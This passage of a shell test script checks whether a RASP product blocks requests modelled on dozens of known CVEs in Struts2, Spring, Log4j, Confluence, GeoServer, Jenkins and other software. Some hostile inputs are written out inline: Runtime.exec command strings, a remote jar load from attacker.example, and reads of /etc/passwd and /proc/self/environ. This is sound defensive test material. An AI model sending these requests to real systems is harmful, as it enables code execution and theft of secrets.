  expect_not_blocked "$version" baseline_deserialization_rmi_registry_bind "${baseline_url}/rasp/policy/deserialization-rmi-registry-bind"
  expect_not_blocked "$version" baseline_coldfusion_amf_deserialization -X POST -H "Content-Type: application/x-amf" --data-binary "@${coldfusion_amf_body_file}" "${baseline_url}/flex2gateway/amf"
  expect_not_blocked "$version" baseline_xml_decoder "${baseline_url}/rasp/xml/decoder"
  expect_not_blocked "$version" baseline_xml_decoder_webshell "${baseline_url}/rasp/xml/decoder-webshell"
  expect_not_blocked "$version" baseline_weblogic_workcontext_xml_decoder -X POST -H "Content-Type: text/xml" --data-binary "$weblogic_workcontext_body" "${baseline_url}/wls-wsat/CoordinatorPortType"
  expect_not_blocked "$version" baseline_xop_attachment -G --data-urlencode "href=file:///etc/hosts" "${baseline_url}/rasp/policy/xml-attachment"
  expect_not_blocked "$version" baseline_cxf_aegis_xop_attachment -X POST -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" --data-binary "$cxf_xop_body" "${baseline_url}/test"
  expect_not_blocked "$version" baseline_argfile_expansion "${baseline_url}/rasp/policy/argument-file-expansion"
  expect_not_blocked "$version" baseline_jenkins_cve_2024_23897_proc_environ -G --data-urlencode "arg=help" --data-urlencode "arg=1" --data-urlencode "arg=@/proc/self/environ" "${baseline_url}/rasp/policy/argument-file-expansion"
  expect_not_blocked "$version" baseline_jenkins_cve_2024_23897_connect_node_passwd -G --data-urlencode "arg=connect-node" --data-urlencode "arg=@/etc/passwd" "${baseline_url}/rasp/policy/argument-file-expansion"
  expect_not_blocked "$version" baseline_velocity "${baseline_url}/rasp/template/velocity"
  expect_not_blocked "$version" baseline_jexl "${baseline_url}/rasp/policy/jexl-runtime"
  expect_not_blocked "$version" baseline_el "${baseline_url}/rasp/policy/el-runtime"
  expect_not_blocked "$version" baseline_javascript "${baseline_url}/rasp/policy/javascript-runtime"
  expect_not_blocked "$version" baseline_jiffle "${baseline_url}/rasp/policy/jiffle-runtime"
  expect_not_blocked "$version" baseline_geoserver_wms_jiffle -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${baseline_url}/geoserver/wms"
  expect_not_blocked "$version" baseline_geoserver_cve_2022_24816_jiffle_wps -X POST -H "Content-Type: application/xml" --data-binary "$geoserver_jiffle_wps_body" "${baseline_url}/geoserver/wms"
  expect_not_blocked "$version" baseline_jsr223 -G --data-urlencode "script=java.lang.Runtime.getRuntime().exec('id')" "${baseline_url}/rasp/script/jsr223"
  expect_not_blocked "$version" baseline_script_command_stack "${baseline_url}/rasp/policy/script-command-stack"
  expect_not_blocked "$version" baseline_xpath -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${baseline_url}/rasp/xpath"
  expect_not_blocked "$version" baseline_jxpath -G --data-urlencode "expr=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')" "${baseline_url}/rasp/jxpath"
  expect_not_blocked "$version" baseline_java_compile "${baseline_url}/rasp/java/compile"
  expect_not_blocked "$version" baseline_classloader -G --data-urlencode "codebase=http://attacker.example/evil.jar" "${baseline_url}/rasp/classloader/url"
  expect_not_blocked "$version" baseline_spring_config -G --data-urlencode "config=http://127.0.0.1:9/poc.xml" "${baseline_url}/rasp/spring/config"
  expect_not_blocked "$version" baseline_jaas_jndi_config -G --data-urlencode "provider=${jaas_provider_url}" "${baseline_url}/rasp/jaas/config"
  expect_not_blocked "$version" baseline_kafka_cve_2023_25194_druid_sampler_jaas -X POST -H "Content-Type: application/json" --data-binary "$kafka_druid_sampler_body" "${baseline_url}/druid/indexer/v1/sampler?for=connect"
  expect_not_blocked "$version" baseline_geoserver_testwfspost_ssrf -G --data-urlencode "url=http://interal/geoserver/../" --data-urlencode "body=testtest" --data-urlencode "username=admin" --data-urlencode "password=admin" "${baseline_url}/rasp/policy/ssrf-geoserver-testwfspost"
  expect_not_blocked "$version" baseline_geoserver_cve_2021_40822_testwfspost_ssrf -G --data-urlencode "url=http://interal/geoserver/../" --data-urlencode "body=testtest" --data-urlencode "username=admin" --data-urlencode "password=admin" "${baseline_url}/rasp/policy/ssrf-geoserver-testwfspost"
  expect_not_blocked "$version" baseline_weblogic_uddi_ssrf -G --data-urlencode "rdoSearch=name" --data-urlencode "txtSearchname=sdf" --data-urlencode "selfor=Business location" --data-urlencode "operator=${weblogic_uddi_operator_url}" "${baseline_url}/uddiexplorer/SearchPublicRegistries.jsp"
  expect_not_blocked "$version" baseline_jmx_remote_config "${baseline_url}/rasp/jmx/invoke"
  expect_not_blocked "$version" baseline_activemq_jolokia_broker_config -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_body" "${baseline_url}/api/jolokia/"
  expect_not_blocked "$version" baseline_activemq_jolokia_file_write -X POST -H "Content-Type: application/json" --data-binary "$activemq_jolokia_file_write_body" "${baseline_url}/api/jolokia/"
  expect_not_blocked "$version" baseline_jmx_file_write "${baseline_url}/rasp/jmx/write"
  expect_not_blocked "$version" baseline_bean_pollution -G --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i" "${baseline_url}/rasp/request"
  expect_not_blocked "$version" baseline_spring_cve_2022_22965_tomcatwar_accesslog_jsp -H "suffix: %>//" -H "c1: Runtime" -H "c2: <%" "${baseline_url}/?${spring_cve_2022_22965_query}"
  expect_not_blocked "$version" baseline_internal_identity "${baseline_url}/rasp/policy/request-internal-identity"
  expect_not_blocked "$version" baseline_nacos_cve_2021_29441_list_users -H "User-Agent: Nacos-Server" "${baseline_url}/nacos/v1/auth/users?pageNo=1&pageSize=9"
  expect_not_blocked "$version" baseline_nacos_cve_2021_29441_create_user -X POST -H "User-Agent: Nacos-Server" "${baseline_url}/nacos/v1/auth/users?username=vulhub&password=vulhub"
  expect_not_blocked "$version" baseline_default_jwt_secret "${baseline_url}/rasp/policy/request-default-jwt-secret"
  expect_not_blocked "$version" baseline_jwt_verification_failure "${baseline_url}/rasp/policy/request-jwt-verification-failure"
  expect_not_blocked "$version" baseline_default_crypto_cookie "${baseline_url}/rasp/policy/request-default-crypto-cookie"
  expect_not_blocked "$version" baseline_shiro_cve_2016_4437_default_rememberme -H "Cookie: ${shiro_default_rememberme_cookie}" "${baseline_url}/"
  expect_not_blocked "$version" baseline_serialized_client_state "${baseline_url}/rasp/policy/request-serialized-client-state"
  expect_not_blocked "$version" baseline_default_credential "${baseline_url}/rasp/policy/request-default-credential"
  expect_not_blocked "$version" baseline_empty_credential_bypass "${baseline_url}/rasp/policy/request-empty-credential-bypass"
  expect_not_blocked "$version" baseline_setup_state_reset "${baseline_url}/rasp/policy/request-setup-state-reset"
  expect_not_blocked "$version" baseline_server_side_script_put "${baseline_url}/rasp/policy/request-server-side-script-put"
  expect_not_blocked "$version" baseline_upload_filename_override "${baseline_url}/rasp/policy/request-upload-filename-override"
  expect_not_blocked "$version" baseline_scheduler_shell_job "${baseline_url}/rasp/policy/request-scheduler-shell-job"
  expect_not_blocked "$version" baseline_debug_process_launch "${baseline_url}/rasp/policy/request-debug-process-launch"
  expect_not_blocked "$version" baseline_dynamic_script_config "${baseline_url}/rasp/policy/request-dynamic-script-config"
  expect_not_blocked "$version" baseline_spring_cve_2022_22947_gateway_route_spel -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2022_22947_body" "${baseline_url}/actuator/gateway/routes/hacktest"
  expect_not_blocked "$version" baseline_solr_cve_2019_0193_dataimport_script "${baseline_url}/rasp/policy/request-solr-cve-2019-0193-dataimport-script"
  expect_not_blocked "$version" baseline_elasticsearch_cve_2014_3120_mvel_search_script "${baseline_url}/rasp/policy/request-elasticsearch-cve-2014-3120-search-script"
  expect_not_blocked "$version" baseline_elasticsearch_cve_2015_1427_groovy_search_script "${baseline_url}/rasp/policy/request-elasticsearch-cve-2015-1427-search-script"
  expect_not_blocked "$version" baseline_message_selector_expression "${baseline_url}/rasp/policy/request-spring-messaging-stomp-selector"
  expect_not_blocked "$version" baseline_druid_javascript_sampler "${baseline_url}/rasp/policy/request-druid-javascript-sampler"
  expect_not_blocked "$version" baseline_hugegraph_gremlin_script "${baseline_url}/rasp/policy/request-hugegraph-gremlin-script"
  expect_not_blocked "$version" baseline_ofbiz_groovy_programexport "${baseline_url}/rasp/policy/request-ofbiz-groovy-programexport"
  expect_not_blocked "$version" baseline_ofbiz_remote_decorator_source "${baseline_url}/rasp/policy/request-ofbiz-remote-decorator-source"
  expect_not_blocked "$version" baseline_jenkins_groovy_checkscript "${baseline_url}/rasp/policy/request-jenkins-groovy-checkscript"
  expect_not_blocked "$version" baseline_dynamic_script_json_config "${baseline_url}/rasp/policy/request-dynamic-script-json-config"
  expect_not_blocked "$version" baseline_unomi_context_expression "${baseline_url}/rasp/policy/request-unomi-context-expression"
  expect_not_blocked "$version" baseline_metabase_h2_init_config "${baseline_url}/rasp/policy/request-metabase-h2-init-config"
  expect_not_blocked "$version" baseline_h2_console_jdbc_init "${baseline_url}/rasp/policy/request-h2-console-jdbc-init"
  expect_not_blocked "$version" baseline_h2_console_login_jdbc_init -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=org.h2.Driver" --data-urlencode "url=${h2_console_login_jdbc_url}" "${baseline_url}/h2-console/login.do"
  expect_not_blocked "$version" baseline_weblogic_console_shellsession "${baseline_url}/rasp/policy/request-weblogic-console-shellsession"
  expect_not_blocked "$version" baseline_dataease_h2_datasource_config "${baseline_url}/rasp/policy/request-dataease-h2-datasource-config"
  expect_not_blocked "$version" baseline_expression_header "${baseline_url}/rasp/policy/request-expression-header"
  expect_not_blocked "$version" baseline_spring_cve_2022_22963_functionrouter_spel -X POST -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression: ${spring_cve_2022_22963_expression}" --data-binary "test" "${baseline_url}/functionRouter"
  expect_not_blocked "$version" baseline_expression_content_type "${baseline_url}/rasp/policy/request-expression-content-type"
  expect_not_blocked "$version" baseline_struts2_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${baseline_url}/index.action"
  expect_not_blocked "$version" baseline_jndi_lookup "${baseline_url}/rasp/policy/request-jndi-lookup"
  expect_not_blocked "$version" baseline_log4j_cve_2021_44228_solr_admin_cores -G --data-urlencode "action=${log4shell_jndi_payload}" "${baseline_url}/solr/admin/cores"
  expect_not_blocked "$version" baseline_h2_console_jndi_driver "${baseline_url}/rasp/policy/request-h2-console-jndi-driver"
  expect_not_blocked "$version" baseline_h2_console_login_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${baseline_url}/h2-console/login.do"
  expect_not_blocked "$version" baseline_expression_parameter "${baseline_url}/rasp/policy/request-expression-parameter"
  expect_not_blocked "$version" baseline_struts2_s2001_form_ognl -X POST --data-urlencode "username=${struts2_ognl_runtime_payload}" "${baseline_url}/login.action"
  expect_not_blocked "$version" baseline_struts2_s2007_validation_ognl -X POST --data-urlencode "age=${struts2_ognl_runtime_payload}" "${baseline_url}/user.action"
  expect_not_blocked "$version" baseline_struts2_s2008_devmode_expression -G --data-urlencode "debug=command" --data-urlencode "expression=${struts2_ognl_runtime_payload}" "${baseline_url}/devmode.action"
  expect_not_blocked "$version" baseline_struts2_s2009_delegated_ognl -G --data-urlencode "age=12313" --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/ajax/example5.action"
  expect_not_blocked "$version" baseline_struts2_s2012_redirect_value -G --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/user.action"
  expect_not_blocked "$version" baseline_struts2_s2013_link_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${baseline_url}/link.action"
  expect_not_blocked "$version" baseline_struts2_s2048_showcase_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/integration/saveGangster.action"
  expect_not_blocked "$version" baseline_struts2_s2053_freemarker_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${baseline_url}/index.action"
  expect_not_blocked "$version" baseline_struts2_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${baseline_url}/index.action"
  expect_not_blocked "$version" baseline_struts2_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${baseline_url}/index.action"
  expect_not_blocked "$version" baseline_geoserver_wfs_valuereference "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference"
  expect_not_blocked "$version" baseline_geoserver_cve_2024_36401_wfs_valuereference_get "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference"
  expect_not_blocked "$version" baseline_geoserver_cve_2024_36401_wfs_valuereference_xml "${baseline_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
  expect_not_blocked "$version" baseline_geoserver_cql_filter_sqli "${baseline_url}/rasp/policy/request-geoserver-cql-filter-sqli"
  expect_not_blocked "$version" baseline_geoserver_cve_2023_25157_cql_filter_sqli "${baseline_url}/rasp/policy/request-geoserver-cql-filter-sqli"
  expect_not_blocked "$version" baseline_confluence_delegated_expression "${baseline_url}/rasp/policy/request-confluence-delegated-expression"
  expect_not_blocked "$version" baseline_confluence_cve_2021_26084_webwork_querystring -G --data-urlencode "uri=/pages/doenterpagevariables.action" --data-urlencode "parameter=queryString" --data-urlencode "value=${confluence_cve_2021_26084_query_string}" "${baseline_url}/rasp/policy/request-expression-parameter"
  expect_not_blocked "$version" baseline_confluence_cve_2023_22527_delegated_expression "${baseline_url}/rasp/policy/request-confluence-delegated-expression"
  expect_not_blocked "$version" baseline_expression_json_parameter "${baseline_url}/rasp/policy/request-expression-json-parameter"
  expect_not_blocked "$version" baseline_nexus_cve_2020_10204_extdirect_role_el "${baseline_url}/rasp/policy/request-expression-json-parameter"
  expect_not_blocked "$version" baseline_nexus_cve_2020_10199_go_group_el "${baseline_url}/rasp/policy/request-nexus-go-group-el-expression"
  expect_not_blocked "$version" baseline_nexus_extdirect_jexl_expression "${baseline_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
  expect_not_blocked "$version" baseline_nexus_cve_2019_7238_extdirect_jexl_filter "${baseline_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
  expect_not_blocked "$version" baseline_oauth_expression_parameter "${baseline_url}/rasp/policy/request-oauth-expression-parameter"
  expect_not_blocked "$version" baseline_spring_cve_2016_4977_oauth_response_type_spel -G --data-urlencode "response_type=${spring_cve_2016_4977_response_type}" --data-urlencode "client_id=acme" --data-urlencode "scope=openid" --data-urlencode "redirect_uri=http://test" "${baseline_url}/oauth/authorize"
  expect_not_blocked "$version" baseline_json_patch_expression "${baseline_url}/rasp/policy/request-json-patch-expression"
  expect_not_blocked "$version" baseline_spring_cve_2017_8046_json_patch_spel -X PATCH -H "Content-Type: application/json-patch+json" --data-binary "$spring_cve_2017_8046_body" "${baseline_url}/customers/1"
  expect_not_blocked "$version" baseline_expression_parameter_name "${baseline_url}/rasp/policy/request-expression-parameter-name"
  expect_not_blocked "$version" baseline_spring_cve_2018_1273_data_commons_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2018_1273_field}=&password=&repeatedPassword=" "${baseline_url}/users?page=&size=5"
  expect_not_blocked "$version" baseline_struts2_s2005_eval_parameter_name "${baseline_url}/example/HelloWorld.action?${struts2_s2005_eval_query}"
  expect_not_blocked "$version" baseline_struts2_s2016_redirect_parameter_name "${baseline_url}/index.action?${struts2_s2016_redirect_query}"
  expect_not_blocked "$version" baseline_struts2_s2032_method_parameter_name "${baseline_url}/index.action?${struts2_s2032_method_query}"
  expect_not_blocked "$version" baseline_spring_binding_expression_name "${baseline_url}/rasp/policy/request-spring-binding-expression-name"
  expect_not_blocked "$version" baseline_spring_cve_2017_4971_webflow_binding_spel -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "${spring_cve_2017_4971_field}=vulhub" "${baseline_url}/hotels/booking"
  expect_not_blocked "$version" baseline_expression_path "${baseline_url}/rasp/policy/request-expression-path"
  expect_not_blocked "$version" baseline_confluence_cve_2022_26134_path_ognl -G --data-urlencode "uri=${confluence_cve_2022_26134_path}" "${baseline_url}/rasp/policy/request-expression-path"
  expect_not_blocked "$version" baseline_struts2_s2057_namespace_path --path-as-is "${baseline_url}${struts2_s2057_namespace_path}"
  expect_not_blocked "$version" baseline_xxe_payload "${baseline_url}/rasp/policy/request-xxe-payload"
  expect_not_blocked "$version" baseline_solr_cve_2017_12629_xmlparser_xxe "${baseline_url}/rasp/policy/request-solr-cve-2017-12629-xxe"
  expect_not_blocked "$version" baseline_typed_parameter_deserialization "${baseline_url}/rasp/policy/request-typed-parameter-deserialization"
  expect_not_blocked "$version" baseline_liferay_jsonws_typed_parameter -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-binary "$liferay_jsonws_body" "${baseline_url}/api/jsonws/invoke"
  expect_not_blocked "$version" baseline_typed_payload_deserialization "${baseline_url}/rasp/policy/request-typed-payload-deserialization"
  expect_not_blocked "$version" baseline_hertzbeat_cve_2024_42323_yaml_import "${baseline_url}/rasp/policy/request-hertzbeat-cve-2024-42323-yaml-import"
  expect_not_blocked "$version" baseline_xml_polymorphic_gadget "${baseline_url}/rasp/policy/request-xml-polymorphic-gadget"
  expect_not_blocked "$version" baseline_xstream_jndi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-jndi-xml-gadget"
  expect_not_blocked "$version" baseline_xstream_rmi_xml_gadget "${baseline_url}/rasp/policy/request-xstream-rmi-xml-gadget"
  expect_not_blocked "$version" baseline_template_parameter "${baseline_url}/rasp/policy/request-template-parameter"
  expect_not_blocked "$version" baseline_template_loader_enable "${baseline_url}/rasp/policy/request-template-loader-enable"
  expect_not_blocked "$version" baseline_solr_cve_2019_17558_velocity_template "${baseline_url}/rasp/policy/request-solr-cve-2019-17558-velocity-template"
  expect_not_blocked "$version" baseline_solr_cve_2019_17558_template_loader_enable "${baseline_url}/rasp/policy/request-solr-cve-2019-17558-template-loader-enable"
  expect_not_blocked "$version" baseline_jira_contact_template "${baseline_url}/rasp/policy/request-jira-contact-template"
  expect_not_blocked "$version" baseline_template_json_parameter "${baseline_url}/rasp/policy/request-template-json-parameter"
  expect_not_blocked "$version" baseline_jmreport_freemarker_sql -X POST -H "Content-Type: application/json" --data-binary "$jmreport_freemarker_body" "${baseline_url}/jmreport/queryFieldBySql"
  expect_not_blocked "$version" baseline_template_source "${baseline_url}/rasp/policy/request-template-source"
  expect_not_blocked "$version" baseline_coldfusion_metadata_class_source "${baseline_url}/rasp/policy/request-coldfusion-metadata-class-source"
  expect_not_blocked "$version" baseline_coldfusion_iedit_metadata_class_source -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "_variables=${coldfusion_metadata_payload}" "${baseline_url}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true"
  expect_not_blocked "$version" baseline_locale_source_traversal "${baseline_url}/rasp/policy/request-locale-source-traversal"
  expect_not_blocked "$version" baseline_coldfusion_locale_source_traversal "${baseline_url}/CFIDE/administrator/enter.cfm?locale=${coldfusion_locale_query}"
  expect_not_blocked "$version" baseline_remote_content_stream "${baseline_url}/rasp/policy/request-remote-content-stream"
  expect_not_blocked "$version" baseline_solr_remotestreaming_config_enable "${baseline_url}/rasp/policy/request-solr-remotestreaming-config-enable"
  expect_not_blocked "$version" baseline_solr_remotestreaming_file_read "${baseline_url}/rasp/policy/request-solr-remotestreaming-file-read"
  expect_not_blocked "$version" baseline_remote_import_script_write "${baseline_url}/rasp/policy/request-remote-import-script-write"
  expect_not_blocked "$version" baseline_repository_webroot_write "${baseline_url}/rasp/policy/request-repository-webroot-write"
  expect_not_blocked "$version" baseline_elasticsearch_wooyun_2015_110216_snapshot_webroot_write "${baseline_url}/rasp/policy/request-repository-webroot-write"
  expect_not_blocked "$version" baseline_plot_command_injection "${baseline_url}/rasp/policy/request-plot-command-injection"
  expect_not_blocked "$version" baseline_opentsdb_cve_2020_35476_yrange_plot_command "${baseline_url}/rasp/policy/request-plot-command-injection"
  expect_not_blocked "$version" baseline_opentsdb_cve_2023_25826_key_plot_command "${baseline_url}/rasp/policy/request-opentsdb-key-plot-command-injection"
  expect_not_blocked "$version" baseline_sql_sort_injection "${baseline_url}/rasp/policy/request-sql-sort-injection"
  expect_not_blocked "$version" baseline_sql_identifier_injection "${baseline_url}/rasp/policy/request-skywalking-graphql-sql-identifier"
  expect_not_blocked "$version" baseline_remote_job_submission "${baseline_url}/rasp/policy/remote-job-submission"
  expect_not_blocked "$version" baseline_hadoop_yarn_command_submission "${baseline_url}/rasp/policy/remote-hadoop-yarn-command-submission"
  expect_not_blocked "$version" baseline_teamcity_cve_2024_27198_internal_forward "${baseline_url}/rasp/policy/request-internal-forward"
  expect_not_blocked "$version" baseline_dataease_geo_whitelist_traversal --path-as-is "${baseline_url}/geo/../dataease/de2api/datasource/types"

  expect_block "$version" request_scanner -A "sqlmap/1.7" "${protected_url}/rasp/request"
  expect_block "$version" request_unusual -H "User-Agent:" "${protected_url}/rasp/request"
  expect_block "$version" xss_userinput -G -A "Mozilla/5.0" --data-urlencode "q=<script>alert(1)</script>" "${protected_url}/rasp/request"
  expect_block "$version" request_internal_identity "${protected_url}/rasp/policy/request-internal-identity"
  expect_block "$version" request_nacos_cve_2021_29441_list_users -H "User-Agent: Nacos-Server" "${protected_url}/nacos/v1/auth/users?pageNo=1&pageSize=9"
  expect_block "$version" request_nacos_cve_2021_29441_create_user -X POST -H "User-Agent: Nacos-Server" "${protected_url}/nacos/v1/auth/users?username=vulhub&password=vulhub"
  expect_block "$version" request_default_jwt_secret "${protected_url}/rasp/policy/request-default-jwt-secret"
  expect_block "$version" request_jwt_verification_failure "${protected_url}/rasp/policy/request-jwt-verification-failure"
  expect_block "$version" request_default_crypto_cookie "${protected_url}/rasp/policy/request-default-crypto-cookie"
  expect_block_redirect "$version" request_shiro_cve_2016_4437_default_rememberme -H "Cookie: ${shiro_default_rememberme_cookie}" "${protected_url}/"
  expect_block "$version" request_serialized_client_state "${protected_url}/rasp/policy/request-serialized-client-state"
  expect_block "$version" request_default_credential "${protected_url}/rasp/policy/request-default-credential"
  expect_block "$version" request_empty_credential_bypass "${protected_url}/rasp/policy/request-empty-credential-bypass"
  expect_block "$version" request_setup_state_reset "${protected_url}/rasp/policy/request-setup-state-reset"
  expect_block "$version" request_server_side_script_put "${protected_url}/rasp/policy/request-server-side-script-put"
  expect_block "$version" request_upload_filename_override "${protected_url}/rasp/policy/request-upload-filename-override"
  expect_block "$version" request_scheduler_shell_job "${protected_url}/rasp/policy/request-scheduler-shell-job"
  expect_block "$version" request_debug_process_launch "${protected_url}/rasp/policy/request-debug-process-launch"
  expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-dynamic-script-config"
  expect_block "$version" request_spring_cve_2022_22947_gateway_route_spel -X POST -H "Content-Type: application/json" --data-binary "$spring_cve_2022_22947_body" "${protected_url}/actuator/gateway/routes/hacktest"
  expect_block "$version" request_solr_cve_2019_0193_dataimport_script "${protected_url}/rasp/policy/request-solr-cve-2019-0193-dataimport-script"
  expect_block "$version" request_elasticsearch_cve_2014_3120_mvel_search_script "${protected_url}/rasp/policy/request-elasticsearch-cve-2014-3120-search-script"
  expect_block "$version" request_elasticsearch_cve_2015_1427_groovy_search_script "${protected_url}/rasp/policy/request-elasticsearch-cve-2015-1427-search-script"
  expect_block "$version" request_message_selector_expression "${protected_url}/rasp/policy/request-spring-messaging-stomp-selector"
  expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-druid-javascript-sampler"
  expect_block "$version" request_hugegraph_gremlin_script "${protected_url}/rasp/policy/request-hugegraph-gremlin-script"
  expect_block "$version" request_ofbiz_groovy_programexport "${protected_url}/rasp/policy/request-ofbiz-groovy-programexport"
  expect_block "$version" request_jenkins_groovy_checkscript "${protected_url}/rasp/policy/request-jenkins-groovy-checkscript"
  expect_block "$version" request_dynamic_script_json_config "${protected_url}/rasp/policy/request-dynamic-script-json-config"
  expect_block "$version" request_unomi_context_expression "${protected_url}/rasp/policy/request-unomi-context-expression"
  expect_block "$version" request_metabase_h2_init_config "${protected_url}/rasp/policy/request-metabase-h2-init-config"
  expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-h2-console-jdbc-init"
  expect_block "$version" request_h2_console_login_jdbc_init -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=org.h2.Driver" --data-urlencode "url=${h2_console_login_jdbc_url}" "${protected_url}/h2-console/login.do"
  expect_block "$version" request_dynamic_script_config "${protected_url}/rasp/policy/request-weblogic-console-shellsession"
  expect_block "$version" request_dataease_h2_datasource_config "${protected_url}/rasp/policy/request-dataease-h2-datasource-config"
  expect_block "$version" request_expression_header "${protected_url}/rasp/policy/request-expression-header"
  expect_block "$version" request_spring_cve_2022_22963_functionrouter_spel -X POST -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression: ${spring_cve_2022_22963_expression}" --data-binary "test" "${protected_url}/functionRouter"
  expect_block "$version" request_expression_header_content_type "${protected_url}/rasp/policy/request-expression-content-type"
  expect_block_redirect "$version" request_struts2_s2045_content_type -X POST -H "Content-Type: ${struts2_s2045_content_type}" "${protected_url}/index.action"
  expect_block "$version" request_jndi_lookup "${protected_url}/rasp/policy/request-jndi-lookup"
  expect_block "$version" request_log4j_cve_2021_44228_solr_admin_cores -G --data-urlencode "action=${log4shell_jndi_payload}" "${protected_url}/solr/admin/cores"
  expect_block "$version" request_jndi_lookup "${protected_url}/rasp/policy/request-h2-console-jndi-driver"
  expect_block "$version" request_h2_console_login_jndi_driver -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "driver=javax.naming.InitialContext" --data-urlencode "url=${h2_console_jndi_url}" "${protected_url}/h2-console/login.do"
  expect_block "$version" request_expression_parameter "${protected_url}/rasp/policy/request-expression-parameter"
  expect_block "$version" request_struts2_s2001_form_ognl -X POST --data-urlencode "username=${struts2_ognl_runtime_payload}" "${protected_url}/login.action"
  expect_block "$version" request_struts2_s2007_validation_ognl -X POST --data-urlencode "age=${struts2_ognl_runtime_payload}" "${protected_url}/user.action"
  expect_block "$version" request_struts2_s2008_devmode_expression -G --data-urlencode "debug=command" --data-urlencode "expression=${struts2_ognl_runtime_payload}" "${protected_url}/devmode.action"
  expect_block "$version" request_struts2_s2009_delegated_ognl -G --data-urlencode "age=12313" --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/ajax/example5.action"
  expect_block "$version" request_struts2_s2012_redirect_value -G --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/user.action"
  expect_block "$version" request_struts2_s2013_link_includeparams -G --data-urlencode "a=${struts2_dollar_ognl_runtime_payload}" "${protected_url}/link.action"
  expect_block "$version" request_struts2_s2048_showcase_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/integration/saveGangster.action"
  expect_block "$version" request_struts2_s2053_freemarker_value -X POST --data-urlencode "name=${struts2_ognl_runtime_payload}" "${protected_url}/index.action"
  expect_block "$version" request_struts2_s2059_forced_ognl -X POST --data-urlencode "id=${struts2_ognl_runtime_payload}" "${protected_url}/index.action"
  expect_block "$version" request_struts2_s2061_freemarker_execute -X POST -H "Content-Type: multipart/form-data; boundary=${struts2_s2061_boundary}" --data-binary "@${struts2_s2061_body_file}" "${protected_url}/index.action"
  expect_block "$version" request_geoserver_wfs_valuereference "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference"
  expect_block "$version" request_geoserver_cve_2024_36401_wfs_valuereference_get "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference"
  expect_block "$version" request_geoserver_cve_2024_36401_wfs_valuereference_xml "${protected_url}/rasp/policy/request-geoserver-wfs-valuereference-xml"
  expect_block "$version" request_geoserver_cql_filter_sqli "${protected_url}/rasp/policy/request-geoserver-cql-filter-sqli"
  expect_block "$version" request_geoserver_cve_2023_25157_cql_filter_sqli "${protected_url}/rasp/policy/request-geoserver-cql-filter-sqli"
  expect_block "$version" request_confluence_delegated_expression "${protected_url}/rasp/policy/request-confluence-delegated-expression"
  expect_block "$version" request_confluence_cve_2021_26084_webwork_querystring -G --data-urlencode "uri=/pages/doenterpagevariables.action" --data-urlencode "parameter=queryString" --data-urlencode "value=${confluence_cve_2021_26084_query_string}" "${protected_url}/rasp/policy/request-expression-parameter"
  expect_block "$version" request_confluence_cve_2023_22527_delegated_expression "${protected_url}/rasp/policy/request-confluence-delegated-expression"
  expect_block "$version" request_expression_json_parameter "${protected_url}/rasp/policy/request-expression-json-parameter"
  expect_block "$version" request_nexus_cve_2020_10204_extdirect_role_el "${protected_url}/rasp/policy/request-expression-json-parameter"
  expect_block "$version" request_nexus_cve_2020_10199_go_group_el "${protected_url}/rasp/policy/request-nexus-go-group-el-expression"
  expect_block "$version" request_nexus_extdirect_jexl_expression "${protected_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
  expect_block "$version" request_nexus_cve_2019_7238_extdirect_jexl_filter "${protected_url}/rasp/policy/request-nexus-extdirect-jexl-expression"
  expect_block "$version" request_oauth_expression_parameter "${protected_url}/rasp/policy/request-oauth-expression-parameter"
  expect_block "$version" request_spring_cve_2016_4977_oauth_response_type_spel -G --data-urlencode "response_type=${spring_cve_2016_4977_response_type}" --data-urlencode "client_id=acme" --data-urlencode "scope=openid" --data-urlencode "redirect_uri=http://test" "${protected_url}/oauth/authorize"
  expect_block "$version" request_json_patch_expression "${protected_url}/rasp/policy/request-json-patch-expression"
